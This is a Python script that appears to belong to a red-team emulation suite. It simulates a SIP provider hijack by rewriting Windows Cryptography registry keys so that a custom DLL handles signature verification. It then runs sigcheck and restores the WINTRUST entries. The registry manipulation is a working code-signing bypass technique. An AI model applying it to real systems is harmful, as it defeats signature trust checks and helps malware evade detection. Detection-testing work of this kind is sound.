"""
Name: SIP Provider Modification
RTA: sip_provider.py
ATT&CK: TBD
Description:
The sip_provider.py script simulates registering a mock SIP provider to bypass code integrity checks and execute mock malware. This technique can be used by attackers to modify or bypass code-signing verifications.
Key Features:
- SIP Provider Registration: Registers a new SIP provider DLL with custom verify and signature-getting functions.
- Code Integrity Bypass: Simulates a bypass of code integrity checks using a modified SIP provider.
- Windows-Specific: The script modifies Windows registry entries for SIP providers and is only valid on Windows.
"""

import winreg as winreg
import platform
import common

CRYPTO_ROOT = "SOFTWARE\\Microsoft\\Cryptography\\OID\\EncodingType 0"
VERIFY_DLL_KEY = f"{CRYPTO_ROOT}\\CryptSIPDllVerifyIndirectData\\{{C689AAB8-8E78-11D0-8C47-00C04FC295EE}}"
GETSIG_KEY = f"{CRYPTO_ROOT}\\CryptSIPDllGetSignedDataMsg\\{{C689AAB8-8E78-11D0-8C47-00C04FC295EE}}"


def register_sip_provider(dll_path, verify_function, getsig_function):
    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, VERIFY_DLL_KEY)

    common.log(f"Setting verify dll path: {dll_path}")
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    common.log(f"Setting verify function name: {verify_function}")
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, verify_function)

    hkey = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, GETSIG_KEY)

    common.log(f"Setting getsig dll path: {dll_path}")
    winreg.SetValueEx(hkey, "Dll", 0, winreg.REG_SZ, dll_path)

    common.log(f"Setting getsig function name: {getsig_function}")
    winreg.SetValueEx(hkey, "FuncName", 0, winreg.REG_SZ, getsig_function)


if common.is_64bit():
    sigcheck = common.get_path("bin", "sigcheck64.exe")
    trust_provider_dll = common.get_path("bin", "TrustProvider64.dll")
else:
    sigcheck = common.get_path("bin", "sigcheck32.exe")
    trust_provider_dll = common.get_path("bin", "TrustProvider32.dll")

target_app = common.get_path("bin", "myapp.exe")


@common.dependencies(sigcheck, trust_provider_dll, target_app)
def main():
    # Ensure script only runs on Windows
    if platform.system() != 'Windows':
        common.log("This script only runs on Windows.")
        return common.UNSUPPORTED_RTA

    common.log("Registering SIP provider")
    register_sip_provider(trust_provider_dll, "VerifyFunction", "GetSignature")

    common.log("Launching sigcheck")
    common.execute([sigcheck, "-accepteula", target_app])

    common.log("Cleaning up", log_type="-")
    wintrust = "C:\\Windows\\System32\\WINTRUST.dll"
    register_sip_provider(wintrust, "CryptSIPVerifyIndirectData", "CryptSIPGetSignedDataMsg")


if __name__ == "__main__":
    exit(main())
